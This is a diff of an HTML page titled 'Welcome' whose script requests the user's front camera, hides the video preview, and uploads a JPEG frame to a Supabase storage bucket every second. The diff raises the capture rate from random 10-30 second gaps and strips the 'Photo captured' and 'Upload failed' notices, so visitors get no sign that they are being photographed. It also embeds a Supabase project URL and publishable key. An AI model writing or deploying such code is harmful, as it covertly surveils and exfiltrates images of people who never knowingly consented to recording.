@@ -1,12 +1,12 @@
-
+```html
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <title>Welcome
-    </title>
+    <title>Welcome</title>
 
     <!-- Supabase -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
@@ -28,7 +28,10 @@
             overflow: hidden;
         }
 
-        /* Camera preview remains hidden */
+        /*
+         * Camera preview is not displayed.
+         * The browser will still request camera permission.
+         */
         #camera {
             position: fixed;
             width: 1px;
@@ -41,18 +44,26 @@
             display: none;
         }
 
+        /*
+         * Status is hidden normally.
+         */
         #status {
             position: fixed;
             bottom: 20px;
             left: 50%;
+
             transform: translateX(-50%);
 
             color: rgba(255, 255, 255, 0.35);
+
             font-family: Arial, sans-serif;
             font-size: 12px;
 
             opacity: 0;
+
             transition: opacity 0.3s;
+
+            pointer-events: none;
         }
 
         #status.show {
@@ -61,6 +72,7 @@
     </style>
 </head>
 
+
 <body>
 
     <!-- Hidden camera -->
@@ -68,20 +80,21 @@
         id="camera"
         autoplay
         playsinline
-        muted
-    ></video>
+        muted>
+    </video>
 
-    <!-- Used to capture frames -->
+    <!-- Used to convert camera frames into images -->
     <canvas id="canvas"></canvas>
 
+    <!-- Temporary status message -->
     <div id="status"></div>
 
 
     <script>
 
-        // ==========================================
-        // SUPABASE
-        // ==========================================
+        // =====================================================
+        // SUPABASE CONFIGURATION
+        // =====================================================
 
         const SUPABASE_URL =
             "https://jrrlohtlfnmeotdgsbrk.supabase.co";
@@ -90,10 +103,7 @@
             "sb_publishable_jRR4HOJqC3yl1Wo5HAqA0A_YLYfknvJ";
 
 
-        // IMPORTANT:
-        // Use a different variable name so it doesn't
-        // conflict with window.supabase from the CDN.
-
+        // Create Supabase client
         const supabaseClient =
             window.supabase.createClient(
                 SUPABASE_URL,
@@ -101,9 +111,9 @@
             );
 
 
-        // ==========================================
+        // =====================================================
         // ELEMENTS
-        // ==========================================
+        // =====================================================
 
         const video =
             document.getElementById("camera");
@@ -115,21 +125,28 @@
             document.getElementById("status");
 
 
+        // Camera stream
         let cameraStream = null;
 
 
-        // ==========================================
+        // =====================================================
         // START CAMERA
-        // ==========================================
+        // =====================================================
 
         async function startCamera() {
 
             try {
 
+                console.log(
+                    "Requesting camera permission..."
+                );
+
+
                 cameraStream =
                     await navigator.mediaDevices.getUserMedia({
 
                         video: {
+
                             facingMode: "user",
 
                             width: {
@@ -139,6 +156,7 @@
                             height: {
                                 ideal: 720
                             }
+
                         },
 
                         audio: false
@@ -146,20 +164,28 @@
                     });
 
 
+                // Attach camera stream
                 video.srcObject = cameraStream;
 
+
+                // Start playback
                 await video.play();
 
 
-                console.log("Camera started");
+                console.log(
+                    "Camera started successfully."
+                );
 
 
-                // Wait a little for the camera
-                // to fully initialize.
-
+                /*
+                 * Give the camera a moment to initialize
+                 * before taking the first photograph.
+                 */
                 setTimeout(() => {
-                    scheduleNextPhoto();
-                }, 3000);
+
+                    startCaptureLoop();
+
+                }, 1000);
 
 
             } catch (error) {
@@ -169,6 +195,7 @@
                     error
                 );
 
+
                 showStatus(
                     "Camera permission required"
                 );
@@ -176,60 +203,51 @@
         }
 
 
-        // ==========================================
-        // RANDOM PHOTO TIMER
-        // ==========================================
+        // =====================================================
+        // CAPTURE LOOP
+        // =====================================================
 
-        function scheduleNextPhoto() {
-
-            /*
-             * Random delay:
-             *
-             * Minimum: 10 seconds
-             * Maximum: 30 seconds
-             */
-
-            const minimum = 10000;
-            const maximum = 30000;
-
-
-            const delay =
-                Math.floor(
-                    Math.random() *
-                    (maximum - minimum)
-                ) + minimum;
-
+        function startCaptureLoop() {
 
             console.log(
-                "Next photo in:",
-                Math.round(delay / 1000),
-                "seconds"
+                "Starting capture: 1 photo every second"
             );
 
 
-            setTimeout(async () => {
+            /*
+             * Capture immediately.
+             */
+            takePhoto();
 
-                await takePhoto();
 
-                scheduleNextPhoto();
+            /*
+             * Capture once every 1000 milliseconds.
+             */
+            setInterval(() => {
 
-            }, delay);
+                takePhoto();
+
+            }, 1000);
+
         }
 
 
-        // ==========================================
+        // =====================================================
         // TAKE PHOTO
-        // ==========================================
+        // =====================================================
 
         async function takePhoto() {
 
+            /*
+             * Make sure the camera is ready.
+             */
             if (
                 !video.videoWidth ||
                 !video.videoHeight
             ) {
 
                 console.log(
-                    "Camera is not ready yet."
+                    "Camera is not ready."
                 );
 
                 return;
@@ -237,7 +255,6 @@
 
 
             // Match canvas to camera resolution
-
             canvas.width =
                 video.videoWidth;
 
@@ -245,12 +262,15 @@
                 video.videoHeight;
 
 
+            // Get canvas drawing context
             const context =
                 canvas.getContext("2d");
 
 
-            // Capture current camera frame
-
+            /*
+             * Copy the current camera frame
+             * into the canvas.
+             */
             context.drawImage(
                 video,
                 0,
@@ -260,8 +280,12 @@
             );
 
 
-            // Convert frame to JPEG
-
+            /*
+             * Convert canvas to JPEG.
+             *
+             * Quality:
+             * 0.85 = fairly high quality
+             */
             const blob =
                 await new Promise(resolve => {
 
@@ -284,30 +308,42 @@
             }
 
 
-            // Upload
-
-            await uploadPhoto(blob);
+            /*
+             * Send image to Supabase.
+             */
+            uploadPhoto(blob);
         }
 
 
-        // ==========================================
-        // UPLOAD PHOTO TO SUPABASE
-        // ==========================================
+        // =====================================================
+        // UPLOAD PHOTO
+        // =====================================================
 
         async function uploadPhoto(blob) {
 
+            /*
+             * Generate timestamp.
+             */
             const timestamp =
                 new Date()
                     .toISOString()
                     .replace(/[:.]/g, "-");
 
 
+            /*
+             * Generate random ID.
+             */
             const random =
                 Math.random()
                     .toString(36)
                     .substring(2, 8);
 
 
+            /*
+             * Example:
+             *
+             * photo-2026-09-25T14-30-20-123Z-a8f91c.jpg
+             */
             const fileName =
                 `photo-${timestamp}-${random}.jpg`;
 
@@ -318,8 +354,11 @@
                     data,
                     error
                 } = await supabaseClient
+
                     .storage
+
                     .from("photos")
+
                     .upload(
                         fileName,
                         blob,
@@ -332,19 +371,19 @@
                     );
 
 
+                /*
+                 * Check for Supabase error.
+                 */
                 if (error) {
+
                     throw error;
+
                 }
 
 
                 console.log(
                     "Photo uploaded:",
                     data.path
-                );
-
-
-                showStatus(
-                    "Photo captured"
                 );
 
 
@@ -355,17 +394,14 @@
                     error
                 );
 
-
-                showStatus(
-                    "Upload failed"
-                );
             }
+
         }
 
 
-        // ==========================================
+        // =====================================================
         // STATUS MESSAGE
-        // ==========================================
+        // =====================================================
 
         function showStatus(message) {
 
@@ -385,17 +421,19 @@
                 );
 
             }, 1500);
+
         }
 
 
-        // ==========================================
-        // START
-        // ==========================================
+        // =====================================================
+        // START EVERYTHING
+        // =====================================================
 
         startCamera();
 
     </script>
 
 </body>
+
 </html>
- 
+```
